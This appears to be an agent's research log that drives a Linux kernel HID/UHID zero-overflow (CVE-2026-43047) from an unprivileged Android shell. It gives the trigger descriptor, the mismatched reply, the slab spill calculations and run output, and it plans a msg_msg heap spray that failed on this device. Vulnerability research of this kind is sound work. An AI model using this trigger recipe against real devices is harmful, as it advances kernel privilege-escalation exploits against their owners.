# Phase 13, Round 21 — Hands-on 2–4 byte zero-overflow experiment (CVE-2026-43047)

Date: 2026-11-17
Device: `192.168.1.119:5555` (adb online throughout), kernel `5.4.286-ab0600`,
`uname -m = armv8l` (arm64 kernel, 32-bit ARM userspace), shell `uid=2000(shell)`,
groups include `3011(uhid)`. SELinux enforcing, no root/su, no dmesg/KASAN oracle.

Safety envelope honored at every step:
- At most **4 zero bytes past the underlying kmalloc object**, never the full 4095-byte write.
- No reboot, no system/vendor/block writes, no flashing, no factory reset.
- Device writes limited to `/data/local/tmp` (both temp binaries removed at the end).
- `adb devices`, `getprop sys.boot_completed`, `uptime` checked after **every** run.
- Local writes limited to `tools/kernel/` and this document.

---

## 0. Syscall / capability reconnaissance (Task 0)

Harness: `tools/kernel/ipc_probe.c` → `tools/kernel/ipc_probe` (armv7a static ELF,
raw `svc 0`, no libc). Syscall numbers taken from the authoritative
`v5.4.286 arch/arm/tools/syscall.tbl`:
`msgget=303, msgsnd=301, msgrcv=302, msgctl=304,
mq_open=274, mq_unlink=275, mq_timedsend=276, mq_timedreceive=277`.

Live `/proc/config.gz` (read via `base64` to host, decompressed):

```
# CONFIG_SYSVIPC is not set
# CONFIG_CHECKPOINT_RESTORE is not set
CONFIG_SLUB=y
CONFIG_SLUB_DEBUG=y
# CONFIG_SLUB_DEBUG_ON is not set
# CONFIG_KASAN is not set
CONFIG_ARM64=y
```

Observed output:

```
=== Phase13 Round21 Task0: syscall availability ===
pid=22114
[SysV] msgget(IPC_CREAT|0666) = -38
  -> SysV IPC UNAVAILABLE (kernel compiled without CONFIG_SYSVIPC)
[POSIX mq] mq_open(O_CREAT|O_RDWR,0600) = -13
  -> POSIX mqueue unavailable
=== done ===
```

**Verdict for Task 0:** SysV message queues are **not available** to uid 2000 —
`msgget` returns `-ENOSYS (-38)`, consistent with `CONFIG_SYSVIPC=n`. This is a
kernel build property, not a seccomp restriction. As a fallback we tried POSIX
mqueues (`CONFIG_POSIX_MQUEUE=y`); `mq_open` returns `-EACCES (-13)` — SELinux
denies the shell. Therefore **no `msg_msg` spray and no readable heap canary is
possible on this target**, and Task 1(a)/(d) (spray 200 `msg_msg`, compare tags)
cannot be executed. The UHID trigger experiment (Tasks 1(b)-(e), 2) was still
performed, using UHID event behavior + device health as the oracle.

---

## Source-derived spill math (exact, verified against v5.4.286)

Fetched from `gregkh/linux` tag `v5.4.286` (kernel.org was Anubis-blocked):

`drivers/hid/hid-multitouch.c`, `mt_get_feature()`:
```c
u32 size = hid_report_len(report);                 /* report 3: 1 data byte + id = 2 */
buf = hid_alloc_report_buf(report, GFP_KERNEL);    /* kzalloc(2 + 7) = kzalloc(9) */
ret = hid_hw_raw_request(hdev, report->id, buf, size, HID_FEATURE_REPORT, HID_REQ_GET_REPORT);
if (ret < 0) { dev_warn(...); } else {
        ret = hid_report_raw_event(hdev, HID_FEATURE_REPORT, buf, size, 0);
}
kfree(buf);
```
Note `hid_report_raw_event()` receives `size = hid_report_len(report3) = 2`
**unconditionally** when the request succeeds, regardless of the reply's `size`.

`include/linux/hid.h`:
```c
static inline u32 hid_report_len(struct hid_report *report) {
        return DIV_ROUND_UP(report->size, 8) + (report->id > 0);
}
```

`drivers/hid/uhid.c`, `uhid_hid_get_report()`:
```c
ret = min3(count, (size_t)req->size, (size_t)UHID_DATA_MAX);
memcpy(buf, req->data, ret);
```
So the reply can copy **at most `count = 2` bytes**; it cannot inflate `size`.

`drivers/hid/hid-core.c`, `hid_report_raw_event()`:
```c
report = hid_get_report(report_enum, data);         /* n = data[0] -> we set 4 */
if (report_enum->numbered) { cdata++; csize--; }    /* cdata=buf+1, csize=1 */
rsize = hid_compute_report_size(report);            /* = N4 (report-4 data bytes) */
if (csize < rsize) {
        dbg_hid("report %d is too short, (%d < %d)\n", report->id, csize, rsize);
        memset(cdata + csize, 0, rsize - csize);     /* memset(buf+2, 0, N4-1) */
}
```

**Final math** (N3 = 1 data byte in report 3, N4 = data bytes in report 4):

| Quantity | Formula | Value |
|---|---|---|
| `kzalloc` request for `buf` | `hid_report_len(r3)+7 = (N3+1)+7` | **9 bytes** |
| SLUB bucket on arm64 | `roundup_pow2(9)` | **kmalloc-16** (16 usable bytes) |
| `memset` start | `cdata+csize = buf+1+1` | `buf+2` |
| `memset` length | `rsize-csize = N4-1` | `N4-1` |
| Last written byte | `buf + (2 + (N4-1) - 1)` | `buf+N4` |
| Zero bytes past the 9-byte **request** | `N4 - 8` | e.g. N4=12 → 4 |
| Zero bytes past the 16-byte **object** | `N4 - 15` (only if N4≥16) | e.g. N4=19 → 4 |

Important nuance the task brief did not account for: the `+7` slack is followed
by a further 7 bytes of SLUB rounding (9 → 16), so the *physical* cross-object
spill only starts at `N4 = 16`, not at `N4 = 10` as the "past request" formula
suggests. `N4=12` therefore produces 4 zero bytes past the requested buffer but
stays **entirely inside our own slab object**.

---

## 1–2. UHID experiment (Tasks 1(b)-(e), 2)

Harness: `tools/kernel/uhid_spill.c` → `tools/kernel/uhid_spill` (armv7a static
ELF, raw syscalls). Descriptor (64 bytes) reproduces the confirmed probe trigger:
- Input report ID 1: Finger + ContactID(0x51)/X(0x30)/Y(0x31) → `HID_GROUP_MULTITOUCH`.
- FEATURE report ID 3: `HID_DG_CONTACTMAX` (0x000d0055), 1 byte → probe-time
  `UHID_GET_REPORT(rnum=3, rtype=0, id=1)`.
- FEATURE report ID 4: Vendor 0xFF00 blob, `Report Count = N4` bytes — the
  oversized report selected by the mismatched reply.

Reply on `UHID_GET_REPORT`: `.id = echoed, .err = 0, .size = 1 or 2,
.data[0] = 4, .data[1] = 0` (select report 4). Control mode replies `.data[0]=3`.
After the reply the harness pumps events, issues `UHID_DESTROY`, and reports
`saw_getreport / saw_open / read_errors`.

All writes were zeros only; no report exceeded N4=19 (task cap was 24; we
deliberately stopped at the 4-bytes-past-object hard safety limit).

### Run log

| Run | Mode | N4 | Reply size | Past request | Past object | GET_REPORT | UHID_OPEN | read errors | Health |
|---|---|---|---|---|---|---|---|---|---|
| 1 | CTL (matching, data[0]=3) | 12 | 2 | 4 | -3 | yes | yes | 0 | OK |
| 2 | SPILL (data[0]=4) | 12 | 2 | 4 | -3 | yes | yes | 0 | OK |
| 3 | SPILL | 14 | 2 | 6 | -1 | yes | yes | 0 | OK |
| 4 | SPILL | 16 | 2 | 8 | 1 | yes | yes | 0 | OK |
| 5 | SPILL | 19 | 2 | 11 | 4 | yes | yes | 0 | OK |
| 6 | SPILL (task's size=1 form) | 19 | 1 | 11 | 4 | yes | yes | 0 | OK |

Representative output (run 5, the maximum allowed spill):

```
[cfg] N4=19 mode=SPILL replysize=2
[math] kzalloc(9)->kmalloc-16; memset(buf+2,0,N4-1); bytes past req=11 past object=4
write(CREATE2) ret=4376
  EVENT type=2 (UHID_START) flags=0x00000005 rawlen=4376
  EVENT type=9 (GET_REPORT) id=1 rnum=3 rtype=0 rawlen=4376
  >>> SPILL REPLY id=1 size=2 data[0]=4 data[1]=0
  reply write ret=4376
  EVENT type=4 (UHID_OPEN) rawlen=4376
write(DESTROY) ret=4376
  EVENT type=5 (UHID_CLOSE) rawlen=4376
  EVENT type=3 (UHID_STOP) rawlen=4376
[result] saw_getreport=1 saw_open=1 read_errors=0
```

`size=1` (run 6) produced byte-for-byte identical behavior: `uhid_hid_get_report()`
clamps the copy to `count=2` and `hid_report_raw_event()` is called with `size=2`
either way, so the memset is identical — confirming the task's suggested reply form.

### Health after every run
`adb devices` → `192.168.1.119:5555 device`; `sys.boot_completed` → `1`;
`uptime` stayed continuous (03:54 → 03:59 uptime, no reset). No `read()` errors,
no UHID event silence, probe always reached `UHID_OPEN`, destroy always produced
`UHID_CLOSE`/`UHID_STOP`. Final check: no `vhid-r21` device left in
`/sys/bus/hid/drivers/hid-multitouch/` or `getevent -il`.

---

## 3–4. Final verdict

| Question | Answer |
|---|---|
| Did a 2–4 byte controlled zero overflow occur? | **The vulnerable memset was reached and executed** with the intended parameters (mismatched report 4 selected, `memset` length `N4-1`, up to 4 zero bytes past the 16-byte kmalloc object). Behavior was identical to the safe control at every level. Because `CONFIG_SLUB_DEBUG_ON` and `KASAN` are off, there is no kernel-side detector to confirm the write independently. |
| Is `msg_msg` corruption observable? | **No — not measurable on this target.** `CONFIG_SYSVIPC=n` makes `msgget/msgsnd/msgrcv` return `ENOSYS`; POSIX mqueue fallback is SELinux-denied (`EACCES`). We could not spray `struct msg_msg` or read back tags. This is a capability limitation of the device, not a negative result about the overflow. |
| Did the device stay healthy? | **Yes.** Online, `boot_completed=1`, uptime never reset across all six runs; UHID probe/destroy lifecycle clean; no read errors; no lingering HID devices; temp binaries removed. |

Conclusion: the CVE-2026-43047 trigger path is reachable from an unprivileged
uid-2000 shell through `/dev/uhid`, and a hand-sized (≤4 byte) zero overflow can
be driven to completion without destabilizing the device. Confirming actual
cross-object heap corruption requires either `msg_msg` (absent here) or a
KASAN/SLUB-debug build; neither is available, so no corruption was observed —
only the successful, silent execution of the overflow primitive.

Artifacts: `tools/kernel/ipc_probe.c`, `tools/kernel/uhid_spill.c` (this repo).
All device-side binaries in `/data/local/tmp` were deleted.
